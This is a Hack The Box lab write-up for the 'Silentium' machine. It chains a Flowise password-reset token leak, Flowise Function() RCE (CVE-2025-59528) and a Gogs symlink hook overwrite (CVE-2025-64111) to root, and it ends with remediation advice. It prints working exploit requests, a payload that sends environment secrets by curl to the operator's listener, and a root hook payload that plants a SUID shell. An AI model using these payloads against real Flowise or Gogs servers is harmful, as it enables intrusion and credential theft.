---
title: HTB Silentium
slug: htb-silentium-writeup
htbId: 867
type: writeup
category: htb
avatar: htb-silentium.png
date: 2026-04-25
difficulty: easy
os: linux
readTime: 9 min read
points: 20
tags: [WEB, API, DOCKER, GIT, LINUX]
classification: CLASSIFIED-WHITE
summary: Flowise AI staging leak exposes a password reset token, RCE via `Function()` eval drops into Docker, credential reuse pivots to SSH, and a Gogs symlink path traversal overwrites a git hook for root.
engagement:
  platform: Hack The Box
  target: silentium.htb
  ref: 10.129.18.201
  start: 00:00 EDT
  duration: 9 min read
  operator: WDD-01
killchain:
  - { stage: RECON,     sub: "vhost + Flowise 3.0.5", tag: FFUF,    color: cool }
  - { stage: FOOTHOLD,  sub: "token leak + RCE",      tag: FLOWISE, color: warn }
  - { stage: USER,      sub: "cred reuse SSH",        tag: DOCKER,  color: warn }
  - { stage: PRIVESC,   sub: "symlink hook overwrite", tag: GOGS,   color: red  }
  - { stage: ROOT,      sub: "SUID bash",             tag: GOAL,    color: ok   }
loadout:
  - { tool: nmap,    purpose: recon }
  - { tool: ffuf,    purpose: vhost }
  - { tool: curl,    purpose: api }
  - { tool: netcat,  purpose: exfil }
  - { tool: ssh,     purpose: shell }
  - { tool: git,     purpose: exploit }
remediation:
  - Upgrade Flowise past 3.0.12 to patch the forgot-password info disclosure (GHSA-jc5m-wrp2-qq38)
  - Upgrade Flowise past 3.0.6 to eliminate Function() constructor RCE (CVE-2025-59528)
  - Never run Gogs (or any git server) as root
  - Upgrade Gogs past 0.13.3 to fix symlink path traversal via contents API (CVE-2025-64111)
  - Rotate all credentials stored in Docker environment variables
---

::: stage n=1 label="RECON" title="Two ports, one vhost, and a Flowise staging instance nobody locked down."

Nmap shows the usual minimal Linux footprint: {cool:22} SSH and {cool:80} HTTP behind nginx. The web server redirects to `silentium.htb`.

::: terminal title="shell · operator@kali" lang="bash"
$ nmap -sC -sV -p 22,80 10.129.18.201

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
:::

Virtual host fuzzing with ffuf discovers `staging.silentium.htb`:

::: terminal title="vhost · ffuf" lang="bash"
$ ffuf -u http://silentium.htb -H "Host: FUZZ.silentium.htb" \
  -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -ac

staging                 [Status: 200]
:::

Add both to `/etc/hosts`:

::: terminal title="shell · operator@kali" lang="bash"
10.129.18.201 silentium.htb staging.silentium.htb
:::

The main site is a static corporate page for "Silentium International Asset Management". The team section lists a few employees, notably {red:Ben} with only a first name — potential username.

The staging subdomain runs **Flowise 3.0.5**, an open-source AI agent builder:

::: terminal title="api · version check" lang="bash"
$ curl -s http://staging.silentium.htb/api/v1/version
{"version":"3.0.5"}
:::

Most API endpoints return `{"error":"Unauthorized Access"}` — authentication is enabled. But the login endpoint leaks whether a user exists: a non-existent user returns {red:404} while a valid one returns {red:401}.

::: terminal title="api · user enumeration" lang="bash"
$ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"admin@silentium.htb","password":"test"}'
{"statusCode":404,"message":"User Not Found"}

$ curl -s -X POST http://staging.silentium.htb/api/v1/auth/login \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"test"}'
{"statusCode":401,"message":"Incorrect Email or Password"}
:::

Confirmed valid user: `ben@silentium.htb`.

:::

::: stage n=2 label="FOOTHOLD" title="Flowise hands over the keys — literally — via the forgot-password endpoint."

### PII Disclosure (GHSA-jc5m-wrp2-qq38)

Flowise <= 3.0.12 has an information disclosure on the unauthenticated **forgot-password** endpoint. It leaks the user's {red:bcrypt password hash} and a {red:password reset token} in the response body.

::: terminal title="api · forgot-password leak" lang="bash"
$ curl -s -X POST "http://staging.silentium.htb/api/v1/account/forgot-password" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb"}}'
:::

::: terminal title="response · full PII dump" lang="json"
{
  "user": {
    "id": "e26c9d6c-678c-4c10-9e36-01813e8fea73",
    "name": "admin",
    "email": "ben@silentium.htb",
    "credential": "$2a$05$6o1ngPjXiRj.EbTK33PhyuzNBn2CLo8.b0lyys3Uht9Bfuos2pWhG",
    "tempToken": "KlbeT5AxSSKrgCiiRTPpky7ySZtGv3l8YHLHbKBIthS88jZQD3PlVOLbhfoqyv7B",
    "tokenExpiry": "2026-04-12T20:04:41.311Z",
    "status": "active"
  }
}
:::

We get a bcrypt hash (cost factor 5 — crackable) and, more importantly, a `tempToken` valid for 15 minutes. ==No cracking needed — the token lets us reset the password directly.==

### Password Reset via tempToken

::: terminal title="api · password reset" lang="bash"
$ curl -s -X POST "http://staging.silentium.htb/api/v1/account/reset-password" \
  -H "Content-Type: application/json" \
  -d '{"user":{"email":"ben@silentium.htb","tempToken":"KlbeT5AxSSKrgCiiRTPpky7ySZtGv3l8YHLHbKBIthS88jZQD3PlVOLbhfoqyv7B","password":"Pwned2026!"}}'
:::

Password reset confirmed. Now we log in and grab the Flowise API key. The `x-request-from: internal` header is critical — it bypasses the Flowise basic auth middleware layer, letting the JWT session cookie reach the API key endpoint.

::: terminal title="api · login + API key retrieval" lang="bash"
$ curl -s -X POST "http://staging.silentium.htb/api/v1/auth/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"ben@silentium.htb","password":"Pwned2026!"}' \
  -c /tmp/cookies.txt

$ curl -s -H "x-request-from: internal" -b /tmp/cookies.txt \
  "http://staging.silentium.htb/api/v1/apikey"
[{"id":"dbb137c0-631d-4e5d-8ece-f73896813d2f","apiKey":"hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc",...}]
:::

### RCE via CustomMCP (CVE-2025-59528)

Flowise < 3.0.6 has a {red:CVSS 10.0} RCE. The **CustomMCP** node passes user input from `mcpServerConfig` directly to JavaScript's `Function()` constructor — effectively `eval()`.

::: note title="IMPORTANT DETAILS"
- `mcpServerConfig` **must** be nested inside the `inputs` object — top-level placement will not trigger execution.
- `process.mainModule.require("child_process")` escapes the `Function()` scope to access Node.js internals.
- Standard bash reverse shells fail because the Docker container runs **Alpine Linux** with BusyBox `sh` — no `/dev/tcp` support. Use Python3 or direct exfiltration instead.
:::

Instead of a full reverse shell, we exfiltrate the container's environment variables directly:

::: terminal title="rce · env exfiltration via callback" lang="bash"
$ nc -lnvp 9002 > /tmp/env_output.txt &

$ curl -s -X POST http://staging.silentium.htb/api/v1/node-load-method/customMCP \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc" \
  -d '{"loadMethod":"listActions","inputs":{"mcpServerConfig":"({x:(function(){const cp = process.mainModule.require(\"child_process\");cp.execSync(\"env | curl -s -X POST -d @- http://10.10.17.35:9002/\");return 1;})()})"}}'
:::

The callback arrives with all environment variables:

::: terminal title="exfil · docker env dump" lang="bash"
FLOWISE_PASSWORD=F1l3_d0ck3r
FLOWISE_USERNAME=ben
SMTP_PASSWORD=r04D!!_R4ge
SENDER_EMAIL=ben@silentium.htb
:::

Two passwords. The `FLOWISE_PASSWORD` is Docker-only, but the `SMTP_PASSWORD` turns out to be reused for SSH.

:::

::: stage n=3 label="USER" title="Credential reuse from Docker env to SSH — the classic lateral move."

The {red:SMTP_PASSWORD} `r04D!!_R4ge` works as Ben's SSH password.

::: terminal title="shell · ben@silentium.htb" lang="bash"
$ ssh ben@silentium.htb
Password: r04D!!_R4ge

ben@silentium:~$ cat user.txt
8d2a459716189909515d4087139a9372
:::

{ok:user.txt captured.}

:::

::: stage n=4 label="PRIVESC" title="Gogs running as root, a symlink, and a git hook that shouldn't exist."

### Internal Service Discovery

First order of business after landing: check for internal services.

::: terminal title="shell · ben@silentium.htb" lang="bash"
ben@silentium:~$ ss -tlnp
127.0.0.1:3001  (Gogs)
127.0.0.1:3000  (Flowise)

ben@silentium:~$ ps aux | grep gogs
root ... /opt/gogs/gogs/gogs web
:::

**Gogs 0.13.3** on port {cool:3001}, running as {red:root}, repos stored at `/root/gogs-repositories`. ==Any code execution through Gogs runs with root privileges.==

### SSH Port Forward

::: terminal title="tunnel · operator@kali" lang="bash"
$ ssh -L 3001:127.0.0.1:3001 ben@silentium.htb -f -N
:::

Gogs is now accessible at `http://127.0.0.1:3001/`.

### Gogs Account + Repo Setup

Registration requires solving a visual CAPTCHA at `http://127.0.0.1:3001/user/sign_up`. After registering, create an API token and a repository:

::: terminal title="api · gogs setup" lang="bash"
$ curl -s -X POST "http://127.0.0.1:3001/api/v1/users/pwner/tokens" \
  -u "pwner:Pwn3d2026!" -H "Content-Type: application/json" \
  -d '{"name":"exploit"}'
{"name":"exploit","sha1":"715621f9c65a4111d07e52022dfaea5eab8c25b6"}

$ curl -s -X POST "http://127.0.0.1:3001/api/v1/user/repos" \
  -H "Authorization: token $TOKEN" -H "Content-Type: application/json" \
  -d '{"name":"hookpwn"}'
:::

### Symlink Path Traversal to RCE (CVE-2025-64111)

Gogs <= 0.13.3 allows authenticated users to modify files within the `.git` directory through the **contents API** by following symlinks. The `UpdateRepoFile` function bypasses the security checks that the web UI enforces.

The target: the **pre-receive git hook** in the bare repository. Since Gogs runs as root, the hook fires as root on every `git push`.

**Step 1** — Create and push a symlink pointing to the pre-receive hook:

::: terminal title="exploit · symlink creation" lang="bash"
$ cd /tmp && mkdir hookpwn && cd hookpwn && git init
$ git config user.email "pwner@pwn.com"
$ git config user.name "pwner"

$ ln -s /root/gogs-repositories/pwner/hookpwn.git/hooks/pre-receive evil.link

$ git add evil.link
$ git commit -m 'add'
$ git push "http://${TOKEN}@127.0.0.1:3001/pwner/hookpwn.git" master
:::

**Step 2** — Overwrite the hook through the symlink via the API:

::: terminal title="exploit · hook overwrite via API" lang="bash"
$ PAYLOAD='#!/bin/bash
/bin/cp /bin/bash /tmp/r00t
/bin/chmod u+s /tmp/r00t
/bin/chmod 4755 /tmp/r00t
/bin/cat /root/root.txt > /tmp/rflag.txt
/bin/chmod 644 /tmp/rflag.txt'

$ B64=$(printf '%s' "$PAYLOAD" | base64 -w0)

$ curl -X PUT "http://127.0.0.1:3001/api/v1/repos/pwner/hookpwn/contents/evil.link" \
  -H "Authorization: token $TOKEN" \
  -H "Content-Type: application/json" \
  -d "{\"message\":\"update\",\"committer\":{\"name\":\"pwner\",\"email\":\"pwner@pwn.com\"},\"content\":\"$B64\"}"
:::

The API follows the symlink and writes our payload directly to the **pre-receive** hook file.

**Step 3** — Trigger the hook with any `git push`:

::: terminal title="exploit · trigger hook" lang="bash"
$ echo "trigger" > trigger.txt
$ git add trigger.txt
$ git commit -m 'trigger'
$ git push "http://${TOKEN}@127.0.0.1:3001/pwner/hookpwn.git" master
:::

::: opsec
The symlink target must be an absolute path to the bare repo's hook directory. Since Gogs stores repos under `/root/gogs-repositories/`, you need to know the exact username and repo name you registered.
:::

:::

::: stage n=5 label="ROOT" title="SUID bash drops. Game over."

The pre-receive hook executed as root, creating a SUID bash binary and copying the root flag.

::: terminal title="shell · ben@silentium.htb" lang="bash"
ben@silentium:~$ ls -la /tmp/r00t
-rwsr-xr-x 1 root root 1446024 ... /tmp/r00t

ben@silentium:~$ /tmp/r00t -p
r00t-5.2# id
uid=1000(ben) gid=1000(ben) euid=0(root) groups=1000(ben),100(users)

r00t-5.2# cat /root/root.txt
f1e788007cb0a0fadd2c29fcfb59d0a9
:::

{ok:root.txt captured.} Rooted.

::: warn
Three CVEs chained: an info disclosure that leaked a reset token ({red:GHSA-jc5m-wrp2-qq38}), an RCE via `Function()` eval ({red:CVE-2025-59528}, CVSS 10.0), and a symlink path traversal in Gogs ({red:CVE-2025-64111}). None required advanced tooling — just `curl`, `git`, and patience.
:::

:::
